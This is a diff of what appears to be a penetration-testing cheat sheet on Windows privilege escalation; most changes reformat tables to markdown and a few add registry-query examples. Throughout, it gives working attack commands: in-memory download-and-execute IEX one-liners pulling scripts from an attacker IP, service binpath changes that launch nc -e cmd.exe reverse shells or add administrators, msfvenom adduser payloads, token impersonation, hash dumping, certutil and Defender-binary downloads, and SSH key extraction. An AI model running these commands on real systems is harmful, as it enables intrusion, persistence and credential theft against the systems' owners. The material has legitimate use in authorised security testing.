@@ -1,104 +1,33 @@
 # Privilege Escalation
 
+## Privilege Escalation
+
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
 {% endhint %}
 
-## PowerShell Script Execution Policy Bypass Methods
+### PowerShell Script Execution Policy Bypass Methods
 
-<table>
-  <thead>
-    <tr>
-      <th style="text-align:left">Bypass Method</th>
-      <th style="text-align:left">Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td style="text-align:left"><code>Set-Executionpolicy unrestricted</code>
-      </td>
-      <td style="text-align:left">Administrator rights are required.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>Set-ExecutionPolicy -Scope CurrentUser Unrestricted</code>
-      </td>
-      <td style="text-align:left">Only works in the context of the current user, but requires no Administrator
-        rights.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">
-        <ol>
-          <li>Open .ps1 file in text editor.</li>
-          <li>Copy all text in the file</li>
-          <li>Paste into PowerShell</li>
-        </ol>
-      </td>
-      <td style="text-align:left">PowerShell will run each line of the script one at a time, essentially
-        the same as running the script.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>function &lt;name&gt; { &lt;code_here&gt; }</code>
-      </td>
-      <td style="text-align:left">Similar to the above example, however you paste your code inside the curly
-        braces, and run the code by typing the <code>&lt;name&gt;</code> of your
-        function. Allows for <b>code reuse without having to copy and paste multiple times.</b>
-      </td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>cat $script | IEX</code>
-      </td>
-      <td style="text-align:left">Pipes the content of the script to the <code>Invoke-Expression</code> cmdlet,
-        which runs any specified string as a command and returns the results to
-        the console. <code>IEX</code> is an alias for <code>Invoke-Expression</code>.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>IEX { &lt;code_here&gt; }</code>
-      </td>
-      <td style="text-align:left">Essentially creates a one-time use function from your code.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>&amp; { &lt;code_here&gt; }</code>
-      </td>
-      <td style="text-align:left">The operator (<code>&amp;</code>) is an alias for <code>Invoke-Expression</code> and
-        is equivalent to the example above.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>. { &lt;code_here&gt; }</code>
-      </td>
-      <td style="text-align:left">The operator (<code>.</code>) can be used to create an anonymous one-time
-        function. This can sometimes be used to bypass certain constrained language
-        modes.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left">
-        <p><code>$text = Get-Content $text_file -Raw</code>
-        </p>
-        <p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code>
-        </p>
-        <p>&lt;code&gt;&lt;/code&gt;</p>
-        <p><code>&amp; $script</code>
-        </p>
-      </td>
-      <td style="text-align:left">Using the .NET object <code>System.Management.Automation.ScriptBlock</code> we
-        can compile and text content to a script block. Then, using (<code>&amp;</code>)
-        we can easily execute this compiled and formatted text file.</td>
-    </tr>
-    <tr>
-      <td style="text-align:left"><code>Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) | PowerShell -NoProfile -</code>
-      </td>
-      <td style="text-align:left">Download script from attacker&apos;s machine, then run in PowerShell,
-        in memory. No files are written to disk.</td>
-    </tr>
-  </tbody>
-</table>
+| Bypass Method                                                                                                                                                                                                  | Description                                                                                                                                                                                                             |
+| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `Set-Executionpolicy unrestricted`                                                                                                                                                                             | Administrator rights are required.                                                                                                                                                                                      |
+| `Set-ExecutionPolicy -Scope CurrentUser Unrestricted`                                                                                                                                                          | Only works in the context of the current user, but requires no Administrator rights.                                                                                                                                    |
+| <ol><li>Open .ps1 file in text editor.</li><li>Copy all text in the file</li><li>Paste into PowerShell</li></ol>                                                                                               | PowerShell will run each line of the script one at a time, essentially the same as running the script.                                                                                                                  |
+| `function <name> { <code_here> }`                                                                                                                                                                              | Similar to the above example, however you paste your code inside the curly braces, and run the code by typing the `<name>` of your function. Allows for **code reuse without having to copy and paste multiple times.** |
+| `cat $script \| IEX`                                                                                                                                                                                           | Pipes the content of the script to the `Invoke-Expression` cmdlet, which runs any specified string as a command and returns the results to the console. `IEX` is an alias for `Invoke-Expression`.                      |
+| `IEX { <code_here> }`                                                                                                                                                                                          | Essentially creates a one-time use function from your code.                                                                                                                                                             |
+| `& { <code_here> }`                                                                                                                                                                                            | The operator (`&`) is an alias for `Invoke-Expression` and is equivalent to the example above.                                                                                                                          |
+| `. { <code_here> }`                                                                                                                                                                                            | The operator (`.`) can be used to create an anonymous one-time function. This can sometimes be used to bypass certain constrained language modes.                                                                       |
+| <p><code>$text = Get-Content $text_file -Raw</code></p><p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code></p><p>&#x3C;code>&#x3C;/code></p><p><code>&#x26; $script</code></p> | Using the .NET object `System.Management.Automation.ScriptBlock` we can compile and text content to a script block. Then, using (`&`) we can easily execute this compiled and formatted text file.                      |
+| `Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) \| PowerShell -NoProfile -`                                                                                                 | Download script from attacker's machine, then run in PowerShell, in memory. No files are written to disk.                                                                                                               |
 
-### Other Bypass Methods
+#### Other Bypass Methods
 
-#### Execute .ps1 scripts on compromised machine: in memory and other bypass methods
+**Execute .ps1 scripts on compromised machine: in memory and other bypass methods**
 
-If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
+If your are able to use `Invoke-Expresion` (`IEX`) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
 
 ```powershell
 IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ip/$script.ps1")
@@ -131,9 +60,9 @@ powershell.exe
 & $PROFILE
 ```
 
-### Run script code as a function
+#### Run script code as a function
 
-Running the code from your PowerShell script inside a function will completely bypass script execution policies.  Other code protection policies such as JEA may still stop certain cmdlets and code from running, however.
+Running the code from your PowerShell script inside a function will completely bypass script execution policies. Other code protection policies such as JEA may still stop certain cmdlets and code from running, however.
 
 ```powershell
 function $function_name {
@@ -145,13 +74,13 @@ function $function_name {
 
 Then you can re-use the code by just typing the function name.
 
-## Sudo for Windows
+### Sudo for Windows
 
-There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`.  It is not as simple to use as `sudo`, however.  
+There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`. It is not as simple to use as `sudo`, however.
 
-### runas
+#### runas
 
-First run `cmdkey /list`.  If this returns entries, it means that you may able to `runas` a certain user who stored their credentials in Windows.
+First run `cmdkey /list`. If this returns entries, it means that you may able to `runas` a certain user who stored their credentials in Windows.
 
 ```
 runas /savecred /user:$domain\$username $command_to_run
@@ -159,19 +88,20 @@ runas /savecred /user:$domain\$username $command_to_run
 
 This can be used in either cmd.exe or PowerShell.
 
-### runas PowerShell 
+#### runas PowerShell
 
-use the below PowerShell script to run commands as that user.
+Use the below PowerShell script to run commands as another user.
 
-```
+```powershell
 $secPassword = ConvertTo-SecureString "$password" -AsPlainText -Force
 $myCreds = New-Object System.Management.Automation.PSCredential ("$userName", $secpasswd)
 
 [System.Diagnostics.Process]::Start("$command", $myCreds.Username, $myCreds.Password, $computerName)
 ```
-Needs a `password`, `username`, `command`, and `computername` specified in this example, which runs `$command` as the specified user.  
 
-# PowerShell `sudo` script
+Needs a `password`, `username`, `command`, and `computername` specified in this example, which runs `$command` as the specified user.
+
+## PowerShell `sudo` script
 
 https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions
 
@@ -193,45 +123,47 @@ param(
 #$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$DomainName\$UserName",$pw
 
 <#
-Using the $Credential parameter here allows for Windows to prompt for credentials.  
+Using the $Credential parameter below allows for Windows to prompt for credentials.  
 Use the above lines if a password needs to be passed in the command line.
 #>
+
 Start-Process Powershell -Credential $Credential -ArgumentList '-NoProfile -Command &{Start-Process $Script -verb RunAs}'
 }
 ```
 
-Example: `sudo -UserName Administrator -Script C:\tmp\privesc.ps1`
-This will cause Windows to prompt for a password for the Administrator user, then run the privesc script.  Can be used to run a command rather than a script.
+Example: `sudo -UserName Administrator -Script C:\tmp\privesc.ps1` This will cause Windows to prompt for a password for the Administrator user, then run the privesc script. Can be used to run a command rather than a script.
 
 Running this in a function will bypass Script Execution policies, though JEA may still give you trouble.
 
-## Services
+### Services
 
-### Modify service binary path \(_link to persistence pages_\)
+#### Modify service binary path (_link to_ [_persistence_](persistence.md#windows-services) _page_)
 
-If one of the groups you have access to has SERVICE\_ALL\_ACCESS in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:
+If one of the groups you have access to has **`SERVICE_ALL_ACCESS`** in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:
 
-```text
-sc config <service_Name> binpath= "C:\nc.exe -nv <IP> <port> -e C:\WINDOWS\System32\cmd.exe"
-//use SYSTEM privileged service to add your user to administrators group
-sc config <service_Name> binpath= "net localgroup administrators <username> /add"
-//replace executable with your own binary (best to only do this for unused services!)
-sc config <service_name> binpath= "C:\path\to\backdoor.exe"
+```
+sc.exe config $service_Name binpath= "C:\nc.exe -nv $ip $port -e C:\WINDOWS\System32\cmd.exe"
+
+#use SYSTEM privileged service to add your user to administrators group
+sc.exe config $service_Name binpath= "net localgroup administrators <username> /add"
+
+#replace executable with your own binary (best to only do this for unused services!)
+sc.exe config $service_name binpath= "C:\path\to\backdoor.exe"
 ```
 
-### Service Permissions \(TODO:_link to persistence pages_\)
+#### Service Permissions
 
-Other Permissions can be used to escalate privileges: 
+Other Permissions can be used to escalate privileges:
 
-* `SERVICE_CHANGE_CONFIG`: Can reconfigure the service binary 
+* `SERVICE_CHANGE_CONFIG`: Can reconfigure the service binary
 * `WRITE_DAC`: Can reconfigure permissions, leading to `SERVICE_CHANGE_CONFIG`
-* `WRITE_OWNER`: Can become owner, reconfigure permissions 
+* `WRITE_OWNER`: Can become owner, reconfigure permissions
 * `GENERIC_WRITE`: Inherits `SERVICE_CHANGE_CONFIG`
-* `GENERIC_ALL`: Inherits `SERVICE_CHANGE_CONFIG`\(To detect and exploit this vulnerability you can use `exploit/windows/local/service_permissions` in MetaSploit\)
+* `GENERIC_ALL`: Inherits `SERVICE_CHANGE_CONFIG`(To detect and exploit this vulnerability you can use `exploit/windows/local/service_permissions` in MetaSploit)
 
-Check if you can modify the binary that is executed by a service. You can retrieve a list of every binary that is executed by a service using `wmic` \(not in system32\) and check your permissions using `icacls`:
+Check if you can modify the binary that is executed by a service. You can retrieve a list of every binary that is executed by a service using `wmic` (not in system32) and check your permissions using `icacls`:
 
-```text
+```
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
 
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
@@ -239,17 +171,17 @@ for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>n
 
 You can also use `sc.exe` and `icacls`:
 
-```text
+```
 sc.exe query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
 
-### Services registry permissions \(TODO: _link to persistence pages_\)
+#### Services registry permissions (TODO: _link to persistence pages_)
 
 You should check if you can modify any service registry. You can check your permissions over a service registry doing:
 
-```text
+```
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
 #Try to write every service with its current content (to check if you have write permissions)
@@ -260,26 +192,26 @@ get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "
 
 Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have `FullControl`. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`
 
-### Unquoted Service Paths \(TODO: _link to persistence pages_\)
+#### Unquoted Service Paths (TODO: _link to persistence pages_)
 
 If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:
 
-```text
+```
 C:\Program.exe 
 C:\Program Files\Some.exe 
 C:\Program Files\Some Folder\Service.exe
 ```
 
-To list all unquoted service paths \(minus built-in Windows services\)
+To list all unquoted service paths (minus built-in Windows services)
 
-```text
+```
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
 ```
 
--or-
+\-or-
 
-```text
+```
 for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
     for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
         echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
@@ -287,15 +219,15 @@ for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
 )
 ```
 
--also-
+\-also-
 
-```text
+```
 gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
 ```
 
 You can detect and exploit this vulnerability with metasploit using the module: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators $username /add" -f exe-service -o service.exe`
 
-## Extract SSH Keys using PowerShell and Python
+### Extract SSH Keys using PowerShell and Python
 
 * [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
@@ -439,17 +371,17 @@ if __name__ == '__main__':
     run(filename)
 ```
 
-## Misc
+### Misc
 
 TODO: Categorize each of these, prep for scripting, add descriptions
 
-## File Transfters
+### File Transfters
 
-### Download files with Windows FTP
+#### Download files with Windows FTP
 
-Windows has an FTP client built in at `C:\Windows\System32\ftp.exe` that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line.  To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that.  Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:
+Windows has an FTP client built in at `C:\Windows\System32\ftp.exe` that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line. To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that. Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:
 
-```text
+```
 open 10.10.10.10
 anonymous
 anythingoeshere
@@ -460,29 +392,29 @@ bye
 
 Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.
 
-### Download files with PowerShell
+#### Download files with PowerShell
 
-#### Using System.Net.WebClient
+**Using System.Net.WebClient**
 
-```text
+```powershell
 (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.26/shell.ps1', 'shell.ps1')
 ```
 
-#### Using Invoke-WebRequest
+**Using Invoke-WebRequest**
 
-```text
+```powershell
 Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1' -OutFile 'shell.ps1'
 ```
 
-#### Download and Execute
+**Download and Execute in Memory**
 
-```text
+```powershell
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
 ```
 
-#### Using .Net:
+**Using .Net:**
 
-```bash
+```powershell
 $url = "http://10.10.10.10/evil.exe"
 $file = "evil.exe"
 
@@ -496,15 +428,15 @@ $task.wait();
 [io.file]::WriteAllBytes($file, $task.Result.Content.ReadAsByteArrayAsync().Result)
 ```
 
-### **Using Bitsadmin**
+#### **Using Bitsadmin**
 
-```text
+```
 bitsadmin /transfer mydownloadjob /download /priority normal http:///$ip/$file C:\\Users\\%USERNAME%\\AppData\\local\\temp\\$file
 ```
 
-### **Using Certutil**
+#### **Using Certutil**
 
-```text
+```
 certutil.exe -urlcache -split -f "http://$ip/$file" $file
 ```
 
@@ -516,17 +448,17 @@ certutil -urlcache -split -f %url% %file%
 certutil.exe -verifyctl -f -split %url% %file%
 ```
 
-### Using Microsoft Defender MpCmdRun.exe
+#### Using Microsoft Defender MpCmdRun.exe
 
 * [https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/](https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/)
 
-```text
+```
 MpCmdRun.exe -DownloadFile -url $url_of_file -path $out_file_path
 ```
 
 Also: See APT writeup for how to use this tool to retrieve machine account hash for total pwnage!
 
-### C\# Command-line build with csc.exe:
+#### C# Command-line build with csc.exe:
 
 * [https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe)
 
@@ -555,40 +487,41 @@ namespace DownloadImage
 }
 ```
 
-## **Users**
+### **Users**
 
-### **Add User**
+#### **Add User**
 
-```text
+```
 net user hacker hack3dpasswd /add
 ```
 
-### **Make User Admin**
+#### **Make User Admin**
 
-```text
+```
 net localgroup administrators hacker /add
 ```
 
-### Get all members of "Domain Admins" group
+#### Get all members of "Domain Admins" group
 
-```text
+```
 net group "Domain Admins" /domain
 ```
 
-### Password brute force/domain user enumeration \(kerbrute\)
+#### Password brute force/domain user enumeration (kerbrute)
 
 * [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
 
-### Dump password hashes \(Metasploit\)
+#### Dump password hashes (Metasploit)
 
-```text
+```
 msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
 ```
 
-### 
-Find admin users \(Metasploit\)
+####
 
-```text
+Find admin users (Metasploit)
+
+```
 spool /tmp/enumdomainusers.txt
 msf > use auxiliary/scanner/smb/smb_enumusers_domain
 msf > set smbuser Administrator
@@ -600,9 +533,9 @@ msf > run
 msf> spool off
 ```
 
-### Impersonate an administrator \(meterpreter\)
+#### Impersonate an administrator (meterpreter)
 
-```text
+```
 meterpreter > load incognito
 meterpreter > list_tokens -u
 meterpreter > impersonate_token MYDOM\\adaministrator
@@ -610,44 +543,43 @@ meterpreter > getuid
 meterpreter > shell
 ```
 
-### Add a user
+#### Add a user
 
-```text
+```
 C:\> net user hacker /add /domain
 C:\> net group "Domain Admins" hacker /add /domain
 ```
 
-## Covert to and from Base64 with PowerShell
+### Covert to and from Base64 with PowerShell
 
-#### Convert to base64
+**Convert to base64**
 
-```text
+```powershell
 [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('whoami'))
 # d2hvYW1p
 ```
 
-#### Convert from base64
+**Convert from base64**
 
-```text
+```powershell
 [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))
- 
 # whoami
 ```
 
-#### Execute a base64 payload in powershell
+**Execute a base64 payload in powershell**
 
-```text
+```powershell
 powershell.exe -command "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))"
 # hostname\username
 ```
 
-## Using `Runas` to execute commands as another user
+### Using `Runas` to execute commands as another user
 
 {% tabs %}
 {% tab title="PowerShell" %}
-First you have to create a credential object, and specify the computer to connect to.  Can be used both locally and remotely.
+First you have to create a credential object, and specify the computer to connect to. Can be used both locally and remotely.
 
-```bash
+```powershell
 $passwd = ConvertTo-SecureString "$Password" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("$UserName", $passwd)
 $computer = "$ComputerName"
@@ -663,13 +595,13 @@ cmdkey /list
 runas /savecred /user:$user $command
 ```
 
-#### Using runas.exe with known credentials
+**Using runas.exe with known credentials**
 
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:$UserName $Password "$Commands"
 ```
 
-#### Using PsExec.exe with known credentials
+**Using PsExec.exe with known credentials**
 
 ```bash
 PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
@@ -677,39 +609,79 @@ PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
 {% endtab %}
 {% endtabs %}
 
-## **AlwaysInstall Elevated**
+### **AlwaysInstall Elevated**
 
-Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key
+Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`. To check for this, query the **`AlwaysInstallElevated`** property of the **`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`** registry key
 
-```text
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+{% tabs %}
+{% tab title="PowerShell" %}
+#### Using PowerShell drives:
+
+```powershell
+#Query whether the key exists or not
+Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer'
+#-or-
+Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+#Read the value of the AlwaysInstallElevated property
+Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
 ```
 
-#### msfvenom
+####
 
-```text
+#### Using .Net:
+
+1. Open the registry on the remote computer.
+
+```powershell
+$Registry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $Computername)
+```
+
+2\. Open the **`SOFTWARE\Policies\Microsoft\Windows\Installer`** registry key.
+
+```powershell
+$RegistryKey = $Registry.OpenSubKey("SOFTWARE\Policies\Microsoft\Windows\Installer", $true)
+```
+
+3\. Use the **`GetValue()`** method to query the value of the registry key.
+
+```powershell
+$RegistryKey.GetValue('AlwaysInstallElevated')
+```
+
+Using .NET rather than PowerShell drives (as above) is a bit faster and is an easy way to query registry keys and values on remote computers.
+{% endtab %}
+
+{% tab title="cmd.exe" %}
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+{% endtab %}
+{% endtabs %}
+
+**msfvenom**
+
+```
 msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi
 ```
 
-#### msiexec \(on victim machine\)
+**msiexec (on victim machine)**
 
-```text
+```
 msiexec /quiet /qn /i C:\create_user.msi
 ```
 
-#### Metasploit module
+**Metasploit module**
 
-```text
+```
 use exploit/windows/local/always_install_elevated
 ```
 
-## References
+### References
 
 * [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
 * [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 * [https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools](https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools)
-
-
+* [https://adamtheautomator.com/powershell-get-registry-value/](https://adamtheautomator.com/powershell-get-registry-value/)
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
-
